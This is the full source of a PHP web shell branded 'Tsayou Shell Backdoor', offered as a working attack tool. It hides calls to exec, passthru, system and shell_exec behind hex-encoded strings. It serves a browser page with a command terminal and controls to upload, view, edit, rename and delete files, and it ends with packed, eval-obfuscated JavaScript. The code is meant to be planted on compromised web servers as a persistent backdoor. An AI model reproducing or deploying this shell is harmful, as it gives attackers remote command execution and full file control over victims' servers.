<?php
define("__self__", "Ts\x61y\x6fu Sh\x65l\x6c B\x61\x63k\x64o\x6fr");
$i = 10*0;
$x = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "65786563", "7061737374687275", "73797374656d", "7368656c6c5f65786563", "7068705f756e616d65", "6f625f7374617274", "6f625f6765745f636c65616e", "7363616e646972", "66696c6573697a65", "66696c657065726d73",);
foreach ($x as $k => $v) $x[$k] = cv($v);
$p = ((isset($_GET["p"]) ? cv($_GET["p"]) : $x[2]()));
$t = function($s) {
   echo "<blockqu\x6fte>$s</blockquote>";
};
$shwp = function () {
   global $p;
   $ps = $GLOBALS["x"][4]("/(\\\|\/)/", $p);
   foreach ($ps as $k => $v) {
      if ($k == 0 && $v == "") {
         echo "<a href=\"?p=2f\">~</a>/"; continue;
      }
      if ($v == "") continue;
      echo "<a href=\"?p=";
      for ($i = 0; $i <= $k; $i++) {
         echo cv($ps[$i], 0);
         if ($i != $k) echo "2f";
      }
      echo "\">{$v}</a>/";
   }
};
$shwf = function () {
   global $p,
   $x;
   $s = $x[5]($x[28]($p), [".", ".."]);
   foreach ($s as $d) {
      if (!$x[6]("$p/$d")) continue;
      echo "<tr><td><a href=\"?p=".cv("$p/$d", 0)."\" class=\"dir\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$x[19]("Y-m-d H:i", $x[20]("$p/$d"))."\"><i class=\"fa fa-folder\"></i> $d</a></td><td>N/A</td><td><font color=\"".(($x[8]("$p/$d")) ? "#00ff00" : (!$x[9]("$p/$d") ? "red" : null))."\">".perm("$p/$d")."</font></td><td><a href=\"?p=".cv($p, 0)."&a=0x4&n=".cv($d, 0)."&t=d\"><i class=\"fa fa-pencil fa-fw\"></i></a><a href=\"?p=".cv($p, 0)."&a=0x00&n=".cv($d, 0)."\" class=\"delete\" data-type=\"folder\"><i class=\"fa fa-trash fa-fw\"></i></a></td></tr>";
   }
   foreach ($s as $f) {
      if (!$x[7]("$p/$f")) continue;
      $sz = $x[29]("$p/$f")/1024;
      $sz = round($sz, 3);
      echo "<tr><td><a href=\"?p=".cv($p, 0)."&a=0x0&n=".cv($f, 0)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$x[19]("Y-m-d H:i", $x[20]("$p/$f"))."\"><i class=\"fa fa-file\"></i> $f</a></td><td>".(($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB")."</td><td><font color=\"".(($x[8]("$p/$f")) ? "#00ff00" : (!$x[9]("$p/$f") ? "red" : null))."\">".perm("$p/$f")."</font></td><td><a href=\"?p=".cv($p, 0)."&a=0x5&n=".cv($f, 0)."\"><i class=\"fa fa-edit fa-fw\"></i></a><a href=\"?p=".cv($p, 0)."&a=0x4&n=".cv($f, 0)."&t=f\"><i class=\"fa fa-pencil fa-fw\"></i></a><a href=\"?p=".cv($p, 0)."&a=0x00&n=".cv($f, 0)."\" class=\"delete\" data-type=\"file\"><i class=\"fa fa-trash fa-fw\"></i></a><a href=\"?p=".cv($p, 0)."&n=".cv($f, 0)."&download"."\"><i class=\"fa fa-download fa-fw\"></i></a></td></tr>";
   }
};

function a($msg, $s = 1, $l = "") {
   $s = (($s) ? "success" : "error");
   echo "<script>swal({title: \"{$s}\", text: \"{$msg}\", icon: \"{$s}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".cv($GLOBALS["p"], 0).$l."\"}})</script>";
}
function dd($d) {
   if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
   if ($GLOBALS["x"][6]($d)) {
      array_map("dd", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
      rmdir($d);
   } else {
      unlink($d);
   }
}
function cv($s, $t = 1) {
   global $i;
   $r = "";
   if ($t)
      for (; $i < (strlen($s)-1); $i += 2) $r .= chr(hexdec($s[$i].$s[$i+1]));
   else
      for (; $i < strlen($s); $i++) $r .= dechex(ord($s[$i]));
   return $r;
}
function cmd($c) {
   global $x;
   $r = "";
   if (function_exists($x[21])) {
      @$x[21]($c, $r);
      $r = @join("\n", $r);
   } elseif (function_exists($x[22])) {
      $x[26]();
      @$x[22]($c);
      $r = $x[27]();
   } elseif (function_exists($x[23])) {
      $x[26]();
      @$x[23]($c);
      $r = $x[27]();
   } elseif (function_exists($x[24])) {
      $r = $x[24]($c);
   }
   return $r;
}
function perm($f) {
   $f = $GLOBALS["x"][30]($f);
   if (($f & 0xC000) == 0xC000) $r = 's';
   elseif (($f & 0xA000) == 0xA000) $r = 'l';
   elseif (($f & 0x8000) == 0x8000) $r = '-';
   elseif (($f & 0x6000) == 0x6000) $r = 'b';
   elseif (($f & 0x4000) == 0x4000) $r = 'd';
   elseif (($f & 0x2000) == 0x2000) $r = 'c';
   elseif (($f & 0x1000) == 0x1000) $r = 'p';
   else $i = 'u';
   $r .= (($f & 0x0100) ? 'r' : '-');
   $r .= (($f & 0x0080) ? 'w' : '-');
   $r .= (($f & 0x0040) ? (($f & 0x0800) ? 's' : 'x') : (($f & 0x0800) ? 'S' : '-'));
   $r .= (($f & 0x0020) ? 'r' : '-');
   $r .= (($f & 0x0010) ? 'w' : '-');
   $r .= (($f & 0x0008) ? (($f & 0x0400) ? 's' : 'x') : (($f & 0x0400) ? 'S' : '-'));
   $r .= (($f & 0x0004) ? 'r' : '-');
   $r .= (($f & 0x0002) ? 'w' : '-');
   $r .= (($f & 0x0001) ? (($f & 0x0200) ? 't' : 'x') : (($f & 0x0200) ? 'T' : '-'));
   return $r;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="utf-8">
   <meta name="theme-color" content="black">
   <meta name="viewport" content="width=device-width, initial-scale=0.60">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/styles/monokai-sublime.min.css">
   <title><?= __self__ ?></title>
   <style>
      body {
         color: white;
         font-family: serif;
         background-color: black;
      }
      section {
         color: white;
         border: 1px solid white;
      }
      blockquote {
         padding: .1rem 4px;
         border-left: .25rem solid #eceeef;
      }
      .table>tbody>tr>* {
         color: #fff;
         vertical-align: middle;
      }
      .table-hover tbody tr:hover td {
         background: black;
      }
      .cmd-input {
         border: 0px;
         width: 100%;
         background: transparent;
         color: white;
         padding-left: 4px;
         outline: none;
      }
      .form-control {
         background: 0 !important;
         color: #fff !important;
         border-radius: 0;
      }
      .form-control::placeholder {
         color: #fff;
         opacity: 1;
      }
      li {
         margin-left: 5px;
         list-style: none;
      }
      a, a:hover {
         color: white;
      }
   </style>
   <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/highlight.min.js"></script>
   <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
   <script>
      hljs.initHighlightingOnLoad();
   </script>
</head>
<body>
   <section class="bg-dark">
      <div class="d-flex justify-content-between mx-1">
         <div>
            <h3><a href="?"><?= __self__ ?></a></h3>
         </div>
         <div>
            <span>PHP Version: <?= $x[1]() ?></span> <br>
            <a href="<?= "?p=".cv($p, 0)."&a=0x1" ?>" class="mr-2"><i class="fa fa-terminal"></i></a>
            <a href="<?= "?p=".cv($p, 0)."&a=0x2" ?>">+File</a>
            <a href="<?= "?p=".cv($p, 0)."&a=0x3" ?>">+Folder</a>
         </div>
      </div>
      <div class="border-top table-responsive">
         <li>Uname: <?= $x[0]() ?></li>
      </div>
      <form method="post" enctype="multipart/form-data">
         <div class="input-group mb-1 px-1 mt-1">
            <div class="custom-file">
               <input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple>
               <label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label>
            </div>
         </div>
      </form>
      <?php
      if (isset($_FILES["f"])) {
         $n = $_FILES["f"]["name"];
         for (; $i < count($n); $i++) {
            if ($x[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
               a("file uploaded successfully");
            } else {
               a("file failed to upload", 0);
            }
         }
      }
      if (isset($_GET["download"])) {
         header("Content-Type: application/octet-stream");
         header("Content-Transfer-Encoding: Binary");
         header("Content-Length: ".$x[17](cv($_GET["n"])));
         header("Content-disposition: attachment; filename=\"".cv($_GET["n"])."\"");
      }
      ?>
   </section>
   <section class="bg-dark table-responsive my-2">
      <li><span>Path: </span><?php $shwp(); ?></li>
   </section>
   <section class="bg-dark table-responsive">
      <article>
         <?php if (!isset($_GET["a"])): ?>
         <table class="table table-borderless table-hover table-sm text-light">
            <thead>
               <tr>
                  <th>Name</th>
                  <th>Size</th>
                  <th>Permission</th>
                  <th>Action</th>
               </tr>
            </thead>
            <tbody>
               <?php $shwf(); ?>
            </tbody>
         </table>
         <?php else : ?>
         <?php if ($_GET["a"] == "0x00") {
            $loc = $p.'/'.cv($_GET["n"]);
            if ($_GET["t"] == "d") {
               dd($loc);
               if (!$x[12]($loc)) {
                  a("folder deleted successfully");
               } else {
                  a("failed to delete the folder", 0);
               }
            }
            if ($_GET["t"] == "f") {
               $loc = $p.'/'.cv($_GET["n"]);
               unlink($loc);
               if (!$x[12]($loc)) {
                  a("file deleted successfully");
               } else {
                  a("file to delete the folder", 0);
               }
            }
         }
         ?>
         <?php if ($_GET["a"] == "0x1"): $t("Command") ?>
         <div class="px-2 mb-3">
            <form method="post">
               <pre class="border"><code><?= ((isset($_POST["cmd"])) ? "$ {$_POST["cmd"]}\n".cmd($_POST["cmd"] . " 2>&1") : "Type something...") ?></code></pre>
               <table style="border:1px solid white;background:transparent;border-top:0px;" cellpadding=0 cellspacing=0 width="100%">
                  <tr>
                     <td width="1%">$</td>
                     <td>
                        <input type="text" class="cmd-input" name="cmd">
                     </td>
                  </tr>
               </table>
            </form>
         </div>
         <?php elseif ($_GET["a"] == "0x0"): $t("View File") ?>
         <div class="px-2">
            <span>File name : <?= cv($_GET["n"]) ?></span>
            <div class="form-group">
               <pre class="border"><code><?= $x[18]($x[14]($p.'/'.cv($_GET["n"]))) ?></code></pre>
            </div>
         </div>
         <?php elseif ($_GET["a"] == "0x2"): $t("New File") ?>
         <div class="px-2">
            <form method="post">
               <div class="form-group">
                  <label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt">
               </div>
               <div class="form-group">
                  <label for="c">Content :</label><textarea style="resize:none" name="c" id="c" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea>
               </div>
               <div class="form-group">
                  <button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
               </div>
            </form>
            <?php ((isset($_POST["s"])) ? ($x[12]("$p/{$_POST["n"]}") ? a("file name has been used", 0, "&a=0x0") : ($x[13]("$p/{$_POST["n"]}", $_POST["c"]) ? a("file created successfully", 1, "&a=0x0"."&n=".cv($_POST["n"], 0)) : a("file failed to create", 0))) : null); ?>
         </div>
         <?php elseif ($_GET["a"] == "0x3"): $t("New Folder") ?>
         <div class="px-2">
            <form method="post">
               <div class="form-group">
                  <label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off">
               </div>
               <div class="form-group">
                  <button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
               </div>
            </form>
            <?php ((isset($_POST["s"])) ? ($x[12]("$p/{$_POST["n"]}") ? a("folder name has been used", 0, "&a=0x3") : ($x[15]("$p/{$_POST["n"]}") ? a("folder created successfully") : a("folder failed to create", 0))) : null) ?>
         </div>
         <?php elseif ($_GET["a"] == "0x4"): $ty = (($_GET["t"] == "d") ? "Folder" : "File"); $t("Rename {$ty}") ?>
         <div class="px-2">
            <form method="post">
               <div class="form-group">
                  <label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= cv($_GET["n"]) ?>">
               </div>
               <div class="form-group">
                  <button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
               </div>
            </form>
            <?php ((isset($_POST["s"])) ? ($x[16]($p.'/'.cv($_GET["n"]), $_POST["n"]) ? a("successfully changed the ".strtolower($ty)." name") : a("failed to change the ".strtolower($ty)." name", 0)) : null); ?>
         </div>
         <?php elseif ($_GET["a"] == "0x5"): $t("Edit File") ?>
         <div class="px-2">
            <span>File name : <?= cv($_GET["n"]) ?></span>
            <form method="post">
               <div class="form-group">
                  <label for="c">Content :</label><textarea name="c" id="c" cols="30" rows="10" class="form-control"><?= $x[18]($x[14]($p.'/'.cv($_GET["n"]))) ?></textarea>
               </div>
               <div class="form-group">
                  <button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
               </div>
            </form>
            <?php ((isset($_POST["s"])) ? ($x[13]($p.'/'.cv($_GET["n"]), $_POST["c"]) ? a("file contents changed successfully", 1, "&a=0x0&n={$_GET["n"]}") : a("file contents failed to change")) : null) ?>
         </div>
         <?php endif; endif; ?>
      </article>
   </section>
   <section class="bg-dark mt-2 text-center">
      <small>Powered By Indonesian Darknet</small>
   </section>
   <script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
   <script>
      $('.dir').on('click', function() {
         $(this).find('i').removeClass('fa-folder').addClass('fa-folder-open');
      });
      eval(function(p, a, c, k, e, d) {
         e = function(c) {
            return(c < a?'': e(parseInt(c/a)))+((c = c%a) > 35?String.fromCharCode(c+29): c.toString(36))}; if (!''.replace(/^/, String)) {
            while (c--) {
               d[e(c)] = k[c] || e(c)}k = [function(e) {
                  return d[e]}]; e = function() {
               return'\\w+'
            }; c = 1
         }; while (c--) {
            if (k[c]) {
               p = p.replace(new RegExp('\\b'+e(c)+'\\b', 'g'), k[c])}}return p
      }('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});', 41, 41, 'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'), 0, {}))
   </script>
</body>
</html>